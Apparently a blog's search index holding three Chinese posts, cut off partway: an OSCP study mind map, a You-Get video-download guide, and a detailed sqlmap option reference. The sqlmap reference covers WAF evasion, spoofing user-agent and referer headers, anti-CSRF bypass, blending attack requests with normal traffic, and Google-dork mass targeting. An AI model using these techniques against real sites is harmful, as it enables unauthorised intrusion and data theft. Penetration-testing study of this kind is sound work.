<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>OSCP-PWK-知识体系思维导图</title>
      <link href="/2020/02/01/oscp-pwk-zhi-shi-ti-xi-si-wei-dao-tu/"/>
      <url>/2020/02/01/oscp-pwk-zhi-shi-ti-xi-si-wei-dao-tu/</url>
      
        <content type="html"><![CDATA[<p><img src="1.jpg" alt="Linux基础"><br><img src="2.jpg" alt="nc-netcat-ncat"><br><img src="3.jpg" alt="被动信息搜集"><br><img src="4.jpg" alt="主动信息搜集及漏扫"><br><img src="5.jpg" alt="SLMail server的BOF"><br><img src="6.jpg" alt="Linux高阶"><br><img src="7.jpg" alt="win32"><br><img src="8.jpg" alt="MySQL"><br><img src="9.jpg" alt="web漏洞"><br><img src="10.jpg" alt="MySQL提权"><br><img src="11.jpg" alt="Linux提权基础I"><br><img src="12.jpg" alt="Linux提权基础II"><br><img src="13.jpg" alt="Windows提权"></p><blockquote><p>参考文献<br>[1] Offensive Security.Penetration Testing Virtual Labs[Z],[Online]Available:<a href="https://www.offensive-security.com/offensive-security-solutions/virtual-penetration-testing-labs/.(2019)" target="_blank" rel="noopener">https://www.offensive-security.com/offensive-security-solutions/virtual-penetration-testing-labs/.(2019)</a><br>[2] Offensive Security.Penetration Testing with Kali Lab Overview[Z]，[Online]Available:<a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/.(2019)" target="_blank" rel="noopener">https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/.(2019)</a><br>[3] Abatchy.OSCP-like Vulnhub VMs[Z],[Online]Available:<a href="https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms.html.(2017-02-23)" target="_blank" rel="noopener">https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms.html.(2017-02-23)</a><br>[4] happytree.OSCP经验分享[Z]，[Online]Available:<a href="https://xz.aliyun.com/t/1587/.(2017-11-15)" target="_blank" rel="noopener">https://xz.aliyun.com/t/1587/.(2017-11-15)</a><br>[5] g0tmi1k.Basic Linux Privilege Escalation[Z]，[Online]Available:<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/.(2011-08-02)" target="_blank" rel="noopener">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/.(2011-08-02)</a><br>[6] FuzzySecurity.Windows Privilege Escalation Fundamentals[Z]，[Online]Available:<a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/16.html</a></p></blockquote><h4 id="如果觉得图不错，我觉得你可以鼓励一下我。"><a href="#如果觉得图不错，我觉得你可以鼓励一下我。" class="headerlink" title="如果觉得图不错，我觉得你可以鼓励一下我。"></a><center>如果觉得图不错，我觉得你可以鼓励一下我。</center></h4>]]></content>
      
      
      <categories>
          
          <category> OSCP </category>
          
          <category> PenTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
            <tag> PenTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>B站,油管等视频网站视频下载</title>
      <link href="/2020/02/01/shi-pin-wang-zhan-shi-pin-xia-zai/"/>
      <url>/2020/02/01/shi-pin-wang-zhan-shi-pin-xia-zai/</url>
      
        <content type="html"><![CDATA[<h1 id="B站-油管等视频网站视频下载-You-Get"><a href="#B站-油管等视频网站视频下载-You-Get" class="headerlink" title=" B站,油管等视频网站视频下载 You-Get"></a><center> B站,油管等视频网站视频下载 You-Get</center></h1><blockquote><p><strong>前言</strong></p><p>我们有时在视频网站上看到一些经典的视频片段，想要下载下来收藏或分享给朋友。但是很多主流的视频网站必须要安装客户端才可以下载，比较麻烦；也有的并不提供下载功能。<br>我们可以通过一些工具来下载,这里我们介绍一款工具You-Get</p></blockquote><hr><h3 id="You-Get-介绍"><a href="#You-Get-介绍" class="headerlink" title="You-Get 介绍"></a>You-Get 介绍</h3><p>   <a href="https://you-get.org/" target="_blank" rel="noopener">官网</a> https //you-get.org</p><blockquote><p>You-Get is a tiny command-line utility to download media contents (videos, audios, images) from the Web, in case there is no other handy way to do it.</p></blockquote><h3 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h3><pre class="line-numbers language-code"><code class="language-code">$ you-get 'https://www.youtube.com/watch?v=jNQXAC9IVRw'site:                YouTubetitle:               Me at the zoostream:    - itag:          43      container:     webm      quality:       medium      size:          0.5 MiB (564215 bytes)    # download-with: you-get --itag=43 [URL]Downloading Me at the zoo.webm ... 100% (  0.5/  0.5MB) ├██████████████████████████████████┤[1/1]    6 MB/sSaving Me at the zoo.en.srt ... Done.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="You-Get-安装"><a href="#You-Get-安装" class="headerlink" title="You-Get 安装"></a>You-Get 安装</h3><h4 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h4><ul><li>Python 3.2 or above  </li><li>FFmpeg 1.0 or above</li></ul><p><strong>1. Python3 安装请自行搜狗搜索</strong><br><strong>2. FFmpeg 安装</strong></p><pre class="line-numbers language-code"><code class="language-code">$ pip3 install ffmpeg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="1.jpg" alt></p><h4 id="You-Get安装"><a href="#You-Get安装" class="headerlink" title="You-Get安装"></a>You-Get安装</h4><pre class="line-numbers language-code"><code class="language-code">$ pip3 install you-get<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="2.jpg" alt></p><h4 id="You-Get升级"><a href="#You-Get升级" class="headerlink" title="You-Get升级"></a>You-Get升级</h4><pre class="line-numbers language-code"><code class="language-code">$ pip3 install --upgrade you-get<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="至此You-Get就安装完毕了-接下来让我们尝试下吧"><a href="#至此You-Get就安装完毕了-接下来让我们尝试下吧" class="headerlink" title="至此You-Get就安装完毕了.接下来让我们尝试下吧"></a>至此You-Get就安装完毕了.接下来让我们尝试下吧</h3><p>找一个视频 例如: 邓紫棋-光年之外 <a href="https://www.bilibili.com/bangumi/play/ep307677" target="_blank" rel="noopener">https://www.bilibili.com/bangumi/play/ep307677</a><br>打开命令行,进入一个你想存放视频的目录,例如</p><pre><code>cd d:/tmpyou-get https://www.bilibili.com/bangumi/play/ep307677</code></pre><p><img src="4.jpg" alt></p><p>下载成功<br><img src="5.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 视频工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 视频工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap-参数详解</title>
      <link href="/2019/04/04/sqlmap-can-shu-xiang-jie/"/>
      <url>/2019/04/04/sqlmap-can-shu-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><h2 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h2><h3 id="option-选项"><a href="#option-选项" class="headerlink" title="option 选项"></a>option 选项</h3><h4 id="h-列出基础帮助信息并退出"><a href="#h-列出基础帮助信息并退出" class="headerlink" title="-h  列出基础帮助信息并退出"></a>-h  列出基础帮助信息并退出</h4><p>-hh 列出标准帮助信息并退出<br>–version 列出应用版本号并退出 </p><h5 id="（-h-hh用于查询基本帮助信息和全量帮助信息，基本帮助信息列举常用几个语句，例如–wizard、-u、–level、–risk等。"><a href="#（-h-hh用于查询基本帮助信息和全量帮助信息，基本帮助信息列举常用几个语句，例如–wizard、-u、–level、–risk等。" class="headerlink" title="（-h\hh用于查询基本帮助信息和全量帮助信息，基本帮助信息列举常用几个语句，例如–wizard、-u、–level、–risk等。"></a>（-h\hh用于查询基本帮助信息和全量帮助信息，基本帮助信息列举常用几个语句，例如–wizard、-u、–level、–risk等。</h5><h4 id="v-0-6-详细级别0-6"><a href="#v-0-6-详细级别0-6" class="headerlink" title="-v 0-6   详细级别0-6"></a>-v 0-6   详细级别0-6</h4><h5 id="0、只显示python错误以及严重的信息。"><a href="#0、只显示python错误以及严重的信息。" class="headerlink" title="0、只显示python错误以及严重的信息。"></a>0、只显示python错误以及严重的信息。</h5><p>1、同时显示基本信息和警告信息。（默认）<br>2、同时显示debug信息。<br>3、同时显示注入的payload。（建议使用此级别，可显示注入参数）<br>4、同时显示HTTP请求。<br>5、同时显示HTTP响应头。<br>6、同时显示HTTP响应页面。</p><h3 id="target-目标"><a href="#target-目标" class="headerlink" title="target 目标"></a>target 目标</h3><h4 id="d-DIRECT-直连数据库的连接字符"><a href="#d-DIRECT-直连数据库的连接字符" class="headerlink" title="-d DIRECT  直连数据库的连接字符"></a>-d DIRECT  直连数据库的连接字符</h4><h5 id="已知目标数据库的时候使用-d，直连目标数据库，注意是小d，大D是指定要访问的目标的某个库"><a href="#已知目标数据库的时候使用-d，直连目标数据库，注意是小d，大D是指定要访问的目标的某个库" class="headerlink" title="已知目标数据库的时候使用-d，直连目标数据库，注意是小d，大D是指定要访问的目标的某个库"></a>已知目标数据库的时候使用-d，直连目标数据库，注意是小d，大D是指定要访问的目标的某个库</h5><h4 id="u-URL-–url-URL-目标URL"><a href="#u-URL-–url-URL-目标URL" class="headerlink" title="-u URL, –url=URL 目标URL"></a>-u URL, –url=URL 目标URL</h4><h5 id="直接使用sqlmap-网址的方式使用此参数，例如sqlmap-v3-u-www-potian-com"><a href="#直接使用sqlmap-网址的方式使用此参数，例如sqlmap-v3-u-www-potian-com" class="headerlink" title="直接使用sqlmap+网址的方式使用此参数，例如sqlmap -v3 -u www.potian.com"></a>直接使用sqlmap+网址的方式使用此参数，例如sqlmap -v3 -u <a href="http://www.potian.com" target="_blank" rel="noopener">www.potian.com</a></h5><h4 id="l-LOGFILE-从Burp或WebScarab代理日志文件中解析目标"><a href="#l-LOGFILE-从Burp或WebScarab代理日志文件中解析目标" class="headerlink" title="-l LOGFILE  从Burp或WebScarab代理日志文件中解析目标"></a>-l LOGFILE  从Burp或WebScarab代理日志文件中解析目标</h4><h5 id="当使用Burp或WebScarab保存了日志的时候，想从日志文件中筛选目标，可使用此参数，使用绝对路径地址即可。"><a href="#当使用Burp或WebScarab保存了日志的时候，想从日志文件中筛选目标，可使用此参数，使用绝对路径地址即可。" class="headerlink" title="当使用Burp或WebScarab保存了日志的时候，想从日志文件中筛选目标，可使用此参数，使用绝对路径地址即可。"></a>当使用Burp或WebScarab保存了日志的时候，想从日志文件中筛选目标，可使用此参数，使用绝对路径地址即可。</h5><h4 id="x-SITEMAPURL-扫描txt文件里的多个目标"><a href="#x-SITEMAPURL-扫描txt文件里的多个目标" class="headerlink" title="-x SITEMAPURL  扫描txt文件里的多个目标"></a>-x SITEMAPURL  扫描txt文件里的多个目标</h4><p>-m BULKFILE    从一个文件里加载http请求<br>-r REQUESTFILE 针对谷歌对目标url的处理结果<br>-g GOOGLEDORK  从INI配置文件里加载选项</p><h5 id="这几个选项分别是从XML文件、txt文件、请求格式文档里读取目标信息或请求，"><a href="#这几个选项分别是从XML文件、txt文件、请求格式文档里读取目标信息或请求，" class="headerlink" title="这几个选项分别是从XML文件、txt文件、请求格式文档里读取目标信息或请求，"></a>这几个选项分别是从XML文件、txt文件、请求格式文档里读取目标信息或请求，</h5><p>使用较多的是-m，-g可以使用google的搜索结果，<br>例如，直接搜索uid=，查找具有此参数的站点，<br>直接使用sqlmap调用google结果，例：sqlmap -g inurl:php?uid=</p><h4 id="c-CONFIGFILE-从INI配置文件里加载选项"><a href="#c-CONFIGFILE-从INI配置文件里加载选项" class="headerlink" title="-c CONFIGFILE  从INI配置文件里加载选项"></a>-c CONFIGFILE  从INI配置文件里加载选项</h4><h5 id="自行配置sqlmp参数，直接输入绝对路径和其他目标参数就可以使用复杂参数选项"><a href="#自行配置sqlmp参数，直接输入绝对路径和其他目标参数就可以使用复杂参数选项" class="headerlink" title="自行配置sqlmp参数，直接输入绝对路径和其他目标参数就可以使用复杂参数选项"></a>自行配置sqlmp参数，直接输入绝对路径和其他目标参数就可以使用复杂参数选项</h5><h3 id="Request-请求"><a href="#Request-请求" class="headerlink" title="Request 请求"></a>Request 请求</h3><p>这些选项用于指定如何连接目标URL的方法</p><h4 id="–method-METHOD-强制HTTP方法，如：PUT"><a href="#–method-METHOD-强制HTTP方法，如：PUT" class="headerlink" title="–method=METHOD  强制HTTP方法，如：PUT"></a>–method=METHOD  强制HTTP方法，如：PUT</h4><p>–data=DATA   通过post发送的数据字符串</p><h5 id="服务端允许的情况下，"><a href="#服务端允许的情况下，" class="headerlink" title="服务端允许的情况下，"></a>服务端允许的情况下，</h5><p>–method改变默认的http方法，和其他参数配合使用，<br>例如–data，改变为post然后推送数据</p><h4 id="–param-del-PARA-分割参数值字符"><a href="#–param-del-PARA-分割参数值字符" class="headerlink" title="–param-del=PARA  分割参数值字符"></a>–param-del=PARA  分割参数值字符</h4><h5 id="当GET或POST的数据需要用其他字符分割测试参数的时候用到此参数。"><a href="#当GET或POST的数据需要用其他字符分割测试参数的时候用到此参数。" class="headerlink" title="当GET或POST的数据需要用其他字符分割测试参数的时候用到此参数。"></a>当GET或POST的数据需要用其他字符分割测试参数的时候用到此参数。</h5><p>例： –param-del=”;”</p><h4 id="–cookie-COOKIE-http的cookie头部值"><a href="#–cookie-COOKIE-http的cookie头部值" class="headerlink" title="–cookie=COOKIE  http的cookie头部值"></a>–cookie=COOKIE  http的cookie头部值</h4><h5 id="已经获得cookie字符串的时候使用此参数指定cookie，"><a href="#已经获得cookie字符串的时候使用此参数指定cookie，" class="headerlink" title="已经获得cookie字符串的时候使用此参数指定cookie，"></a>已经获得cookie字符串的时候使用此参数指定cookie，</h5><p>cookie获得可考虑使用XSS攻击和嗅探、劫持类攻击。</p><h4 id="–cookie-del-COO-分割cookie值字符"><a href="#–cookie-del-COO-分割cookie值字符" class="headerlink" title="–cookie-del=COO  分割cookie值字符"></a>–cookie-del=COO  分割cookie值字符</h4><h5 id="参数极少用，但一般情况下可对需要分隔的cookie字符进行切分，"><a href="#参数极少用，但一般情况下可对需要分隔的cookie字符进行切分，" class="headerlink" title="参数极少用，但一般情况下可对需要分隔的cookie字符进行切分，"></a>参数极少用，但一般情况下可对需要分隔的cookie字符进行切分，</h5><p>类似于–param-del参数，只是一个是cookie一个是参数。</p><h4 id="–load-cookies-L"><a href="#–load-cookies-L" class="headerlink" title="–load-cookies=L.."></a>–load-cookies=L..</h4><p>从Netscape/wget的格式文件里加载cookies</p><h5 id="指定绝对路径，从wget格式文件里load响应的cookies字符。"><a href="#指定绝对路径，从wget格式文件里load响应的cookies字符。" class="headerlink" title="指定绝对路径，从wget格式文件里load响应的cookies字符。"></a>指定绝对路径，从wget格式文件里load响应的cookies字符。</h5><h4 id="–drop-set-cookie"><a href="#–drop-set-cookie" class="headerlink" title="–drop-set-cookie"></a>–drop-set-cookie</h4><h5 id="忽略响应里的cookie设置"><a href="#忽略响应里的cookie设置" class="headerlink" title="忽略响应里的cookie设置"></a>忽略响应里的cookie设置</h5><p>此参数配合手动cookie参数使用，使用预先获得的cookie。</p><h4 id="–user-agent-AGENT-指定http的UA值"><a href="#–user-agent-AGENT-指定http的UA值" class="headerlink" title="–user-agent=AGENT  指定http的UA值"></a>–user-agent=AGENT  指定http的UA值</h4><p>–random-agent  随机选择UA值</p><h5 id="默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap-dev-xxxxxxx-http-sqlmap-org"><a href="#默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap-dev-xxxxxxx-http-sqlmap-org" class="headerlink" title="默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/.-dev-xxxxxxx(http://sqlmap.org)"></a>默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/<em>.</em>-dev-xxxxxxx(<a href="http://sqlmap.org" target="_blank" rel="noopener">http://sqlmap.org</a>)</h5><p>可以使用–user-agent参数来指定想使用的UA，<br>同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。<br>当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入.<br>另外UA是绕过waf的参数，–user-agent= –random-agent这两个参数可对waf针对恶意ua的防控进行绕过</p><h4 id="–host-HOST"><a href="#–host-HOST" class="headerlink" title="–host=HOST"></a>–host=HOST</h4><h5 id="指定http请求中header里的的host头参数"><a href="#指定http请求中header里的的host头参数" class="headerlink" title="指定http请求中header里的的host头参数"></a>指定http请求中header里的的host头参数</h5><h4 id="–referer-REFERER"><a href="#–referer-REFERER" class="headerlink" title="–referer=REFERER"></a>–referer=REFERER</h4><h5 id="指定HTTP的referer头部值"><a href="#指定HTTP的referer头部值" class="headerlink" title="指定HTTP的referer头部值"></a>指定HTTP的referer头部值</h5><p>在请求中伪造referer，有些waf和安全产品等会对refer进行限制，<br>仅允许本站referer，当waf参数对referer进行了限制后，<br>可使用此参数进行绕过。当–level参数设定为3或者3以上的时候会尝试对referer注入</p><h4 id="–headers-HEADERS"><a href="#–headers-HEADERS" class="headerlink" title="–headers=HEADERS"></a>–headers=HEADERS</h4><h5 id="额外的头部"><a href="#额外的头部" class="headerlink" title="额外的头部"></a>额外的头部</h5><p>指定其他的header信息，XFF等，例如strust2-045试用了Content-Type</p><h4 id="–auth-type-AUTH"><a href="#–auth-type-AUTH" class="headerlink" title="–auth-type=AUTH.."></a>–auth-type=AUTH..</h4><h5 id="http验证类型-Basic-Digest-NTLM-or-PKI"><a href="#http验证类型-Basic-Digest-NTLM-or-PKI" class="headerlink" title="http验证类型 Basic, Digest, NTLM or PKI"></a>http验证类型 Basic, Digest, NTLM or PKI</h5><h4 id="–auth-cred-AUTH"><a href="#–auth-cred-AUTH" class="headerlink" title="–auth-cred=AUTH.."></a>–auth-cred=AUTH..</h4><h5 id="http验证-名字-密码"><a href="#http验证-名字-密码" class="headerlink" title="http验证 名字 密码"></a>http验证 名字 密码</h5><p>http验证类型，详细区别不在此赘述，可参考OAUTH验证详解</p><h4 id="–auth-private-A"><a href="#–auth-private-A" class="headerlink" title="–auth-private=A.."></a>–auth-private=A..</h4><h5 id="http验证-私钥文件"><a href="#http验证-私钥文件" class="headerlink" title="http验证 私钥文件"></a>http验证 私钥文件</h5><p>HTTP代理身份验证凭据，可自动使用username：password和秘钥文件，<br>例如有些访问会使用key，集团sso最爱出现此种场景</p><h4 id="–ignore-401"><a href="#–ignore-401" class="headerlink" title="–ignore-401"></a>–ignore-401</h4><h5 id="忽略http401错误，未授权的"><a href="#忽略http401错误，未授权的" class="headerlink" title="忽略http401错误，未授权的"></a>忽略http401错误，未授权的</h5><p>某些页面访问会返回未授权错误，可使用此参数进行忽略和跳过</p><h4 id="–proxy-PROXY-使用代理连接目标url"><a href="#–proxy-PROXY-使用代理连接目标url" class="headerlink" title="–proxy=PROXY  使用代理连接目标url"></a>–proxy=PROXY  使用代理连接目标url</h4><p>–proxy-cred=PRO..  代理验证证书 名字密码<br>–proxy-file=PRO.. 从文件里加载代理列表<br>–proxy-file=PRO.. 从文件里加载代理列表<br>–ignore-proxy  忽略系统默认代理设置</p><h5 id="当需要使用-g-inurl-php-uid-等参数时，默认无法访问，可使用此参数-海外代理方式使用此功能。"><a href="#当需要使用-g-inurl-php-uid-等参数时，默认无法访问，可使用此参数-海外代理方式使用此功能。" class="headerlink" title="当需要使用 -g inurl:php?uid=等参数时，默认无法访问，可使用此参数+海外代理方式使用此功能。"></a>当需要使用 -g inurl:php?uid=等参数时，默认无法访问，可使用此参数+海外代理方式使用此功能。</h5><p>当代理需要验证的时候，使用-cre指定身份信息，需要使用代理轮巡时，<br>使用文件加载代理设置列表，使用代理轮询也可在对访问ip次数进行了验证的场景使用。</p><h4 id="–tor-使用tor网络"><a href="#–tor-使用tor网络" class="headerlink" title="–tor  使用tor网络"></a>–tor  使用tor网络</h4><p>–tor-port=TORPORT  设置tor代理端口，非默认<br>–tor-type=TORTYPE  这只tor代理类型，http（默认）socks4 socks5<br>–check-tor  检查tor是否正常</p><h5 id="此参数不过多赘述，我也假装不懂。"><a href="#此参数不过多赘述，我也假装不懂。" class="headerlink" title="此参数不过多赘述，我也假装不懂。"></a>此参数不过多赘述，我也假装不懂。</h5><h4 id="–delay-DELAY-设置每个http请求之间的延时间隔"><a href="#–delay-DELAY-设置每个http请求之间的延时间隔" class="headerlink" title="–delay=DELAY  设置每个http请求之间的延时间隔"></a>–delay=DELAY  设置每个http请求之间的延时间隔</h4><h5 id="设置http请求间隔时间，在绕过需求时使用，"><a href="#设置http请求间隔时间，在绕过需求时使用，" class="headerlink" title="设置http请求间隔时间，在绕过需求时使用，"></a>设置http请求间隔时间，在绕过需求时使用，</h5><p>例如单ip单位时间访问多少次，可配合代理和多代理参数使用。</p><h4 id="–timeout-TIMEOUT-设置超时连接间隔，默认30S"><a href="#–timeout-TIMEOUT-设置超时连接间隔，默认30S" class="headerlink" title="–timeout=TIMEOUT  设置超时连接间隔，默认30S"></a>–timeout=TIMEOUT  设置超时连接间隔，默认30S</h4><p>–retries=RETRIES  超时后的尝试次数，默认三次</p><h5 id="超时连接后的尝试间隔，默认30s，"><a href="#超时连接后的尝试间隔，默认30s，" class="headerlink" title="超时连接后的尝试间隔，默认30s，"></a>超时连接后的尝试间隔，默认30s，</h5><p>可手动调整，一遍–timeout和–retries配合使用</p><h4 id="–randomize-RPARAM"><a href="#–randomize-RPARAM" class="headerlink" title="–randomize=RPARAM"></a>–randomize=RPARAM</h4><h5 id="随机改变参数值"><a href="#随机改变参数值" class="headerlink" title="随机改变参数值"></a>随机改变参数值</h5><p>可以设定某一个参数值在每一次请求中随机的变化，<br>长度和类型会与提供的初始值一样，<br>例如上文的–timeout和–retries</p><h4 id="–safe-url-SAFURL-在测试期间，经常去访问url地址"><a href="#–safe-url-SAFURL-在测试期间，经常去访问url地址" class="headerlink" title="–safe-url=SAFURL  在测试期间，经常去访问url地址"></a>–safe-url=SAFURL  在测试期间，经常去访问url地址</h4><p>–safe-freq=SAFREQ  在两次访问安全站点之间发送一个测试请求</p><h5 id="安全访问路径和请求配置用于伪造用户行为身份，"><a href="#安全访问路径和请求配置用于伪造用户行为身份，" class="headerlink" title="安全访问路径和请求配置用于伪造用户行为身份，"></a>安全访问路径和请求配置用于伪造用户行为身份，</h5><p>例如有些模型会验证你的行为路径，<br>可用此方法伪造行为，在攻击行为中夹杂正常访问行为。例如广告浏览、商品查看等。</p><h4 id="–skip-urlencode"><a href="#–skip-urlencode" class="headerlink" title="–skip-urlencode"></a>–skip-urlencode</h4><h5 id="跳过payload参数的编码数据"><a href="#跳过payload参数的编码数据" class="headerlink" title="跳过payload参数的编码数据"></a>跳过payload参数的编码数据</h5><p>跳过URL的有效载荷数据编码，前提是自编码</p><h4 id="–csrf-token-CSR-持有反csrf-token的参数"><a href="#–csrf-token-CSR-持有反csrf-token的参数" class="headerlink" title="–csrf-token=CSR.. 持有反csrf token的参数"></a>–csrf-token=CSR.. 持有反csrf token的参数</h4><p>–csrf-url=CSRFURL  从访问地址中提取反 csrf token</p><h5 id="针对CSRF-服务端通常使用客户端页面增加伪随机数。"><a href="#针对CSRF-服务端通常使用客户端页面增加伪随机数。" class="headerlink" title="针对CSRF,服务端通常使用客户端页面增加伪随机数。"></a>针对CSRF,服务端通常使用客户端页面增加伪随机数。</h5><p>常见的有以下三种方法<br>(1).Cookie Hashing(所有表单都包含同一个伪随机值)<br>(2).验证码<br>(3).One-Time Tokens(不同的表单包含一个不同的伪随机值)。<br>使用反csrf参数，可以对站点的csrf设置进行对抗和绕过</p><h4 id="–force-ssl"><a href="#–force-ssl" class="headerlink" title="–force-ssl"></a>–force-ssl</h4><h5 id="强制使用ssl-https"><a href="#强制使用ssl-https" class="headerlink" title="强制使用ssl/https"></a>强制使用ssl/https</h5><p>强制使用https，也可在url后面增加:443</p><h4 id="–eval-EVALCODE"><a href="#–eval-EVALCODE" class="headerlink" title="–eval=EVALCODE"></a>–eval=EVALCODE</h4><h5 id="请求之前执行提供的python代码后再提交请求（”import-hashlib-id2-hashlib-md5-id-hexdigest-”）"><a href="#请求之前执行提供的python代码后再提交请求（”import-hashlib-id2-hashlib-md5-id-hexdigest-”）" class="headerlink" title="请求之前执行提供的python代码后再提交请求（”import hashlib;id2=hashlib.md5(id).hexdigest()”）"></a>请求之前执行提供的python代码后再提交请求（”import hashlib;id2=hashlib.md5(id).hexdigest()”）</h5><p>有的网站会对提交的参数进行编码或加密，这时候需要根据某个参数的变化，<br>而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。<br>例子： –eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”<br>上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。</p><h3 id="Optimization-优化"><a href="#Optimization-优化" class="headerlink" title="Optimization 优化"></a>Optimization 优化</h3><p>这些选项用来优化sqlmap的性能</p><h4 id="o-打开所有的优化开关"><a href="#o-打开所有的优化开关" class="headerlink" title="-o  打开所有的优化开关"></a>-o  打开所有的优化开关</h4><p>–predict-output  预测常见的查询输出<br>–keep-alive  使用持久的http连接<br>–null-connection  在实际的http响应主题之外检索页面长度<br>–threads=THREADS  当前http请求最大值 默认1  就是最大并发</p><h3 id="Injection-注入"><a href="#Injection-注入" class="headerlink" title="Injection 注入"></a>Injection 注入</h3><p>这些选项用于指定测试那些参数，提供注入payload和篡改脚本</p><h4 id="p-TESTPARAMETER-测试参数"><a href="#p-TESTPARAMETER-测试参数" class="headerlink" title="-p TESTPARAMETER  测试参数"></a>-p TESTPARAMETER  测试参数</h4><p>–skip=SKIP  忽略测试指定的参数<br>–dbms=DBMS  指定数据库类型<br>–dbms-cred=DBMS.. 数据库验证凭据，用户名密码<br>–os=OS  指定操作系统类型<br>–invalid-bignum  对无效值使用大数值<br>–invalid-logical  对无效值使用逻辑操作<br>–invalid-string  对无效值使用随机字符<br>–no-cast  关闭payload生成机制<br>–no-escape  关闭payload字符串转译机制<br>–prefix=PREFIX  注入payload前缀字符<br>–suffix=SUFFIX  注入payload结尾字符<br>–tamper=TAMPER  使用指定的脚本篡改注入数据</p><h5 id="sqlmap默认测试所有的GET和POST参数，"><a href="#sqlmap默认测试所有的GET和POST参数，" class="headerlink" title="sqlmap默认测试所有的GET和POST参数，"></a>sqlmap默认测试所有的GET和POST参数，</h5><p>上文提到过，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，<br>大于等于3的时候也会测试User-Agent和HTTP Referer头的值。<br>这时候可以手动指定-p参数设置想要测试的参数。<br>例如： -p “id,cookie”但是有个别参数不想测试的时候可以使用–skip=“user-agent”参数。<br>目前sqlmapMySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库，<br>如果预知数据库类型和凭证，可使用  –dbms、 –dbms-cred=来制定数据库类型和数据库凭证。<br>同样当预知操作系统类型，可使用–os来指定操作系统类型，默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。<br>无效数值处理：<br>参数：–invalid-bignum –invalid-logical 这两个参数对报错数据、无效数据进行更改，<br>例如默认报错UID=-20,可以通过制定以上参数制定无效的大数字和逻辑，比如uid=999999999和uid=20 and a=b<br>参数：–prefix,–suffix在注入的payload的前面或者后面加一些字符，来保证payload的正常执行，<br>例如在语句中增加–prefix “’)” –suffix “AND (’1’=’1”<br>–tamper 可从tamper库里查找相关内容，使用 –tamper tamper/*.py方式指定</p><h3 id="Detection-侦查"><a href="#Detection-侦查" class="headerlink" title="Detection 侦查"></a>Detection 侦查</h3><p>这些选项用于侦测阶段的定制化</p><h4 id="–level-LEVEL"><a href="#–level-LEVEL" class="headerlink" title="–level=LEVEL"></a>–level=LEVEL</h4><h5 id="级别，从1-5，默认1"><a href="#级别，从1-5，默认1" class="headerlink" title="级别，从1-5，默认1"></a>级别，从1-5，默认1</h5><p>上文多次解释–level对测试参数的影响，一共有五个等级，<br>默认为1，sqlmap使用的payload可以在payloads.xml中看到，<br>你也可以根据相应的格式添加自己的payload内容，默认也有一些，可定制。<br>–level的值大于等于2的时候也会测试HTTP Cookie头的值，<br>大于等于3的时候也会测试User-Agent和HTTP Referer头的值，建议最高级别，会更慢、测试参数更复杂。</p><h4 id="–risk-RISK"><a href="#–risk-RISK" class="headerlink" title="–risk=RISK"></a>–risk=RISK</h4><h5 id="级别-0-3-默认1"><a href="#级别-0-3-默认1" class="headerlink" title="级别 0-3 默认1"></a>级别 0-3 默认1</h5><p>从0-3共有四个风险等级，<br>默认是1，risk1会测试大部分的测试语句，<br>2会增加基于事件的测试语句，<br>3会增加OR语句的注入测试。测试的语句同样可以在payloads.xml中找到，可以自行添加payload。<br>警告：当使用高级别时，可能会使用drop、update等高危语句对整表、整库造成影响，可能导致更新的整个表，可能造成很大的风险。</p><h4 id="–string-STRING-评估被证实为true时的匹配字符串"><a href="#–string-STRING-评估被证实为true时的匹配字符串" class="headerlink" title="–string=STRING  评估被证实为true时的匹配字符串"></a>–string=STRING  评估被证实为true时的匹配字符串</h4><p>–not-string=NOT..  评估被证实为falese的匹配字符串<br>–regexp=REGEXP  评估被证实为true时的匹配正则表达式<br>–code=CODE  评估被证实为true时的匹配http code<br>–text-only 仅比较页面的文本内容<br>–titles  仅比较页面的标题</p><h5 id="sqlmap测试结果取决于返回内容，当页面在刷新或更新后，可能导致返回不同的内容，特别是页面有动态内容的情况下。"><a href="#sqlmap测试结果取决于返回内容，当页面在刷新或更新后，可能导致返回不同的内容，特别是页面有动态内容的情况下。" class="headerlink" 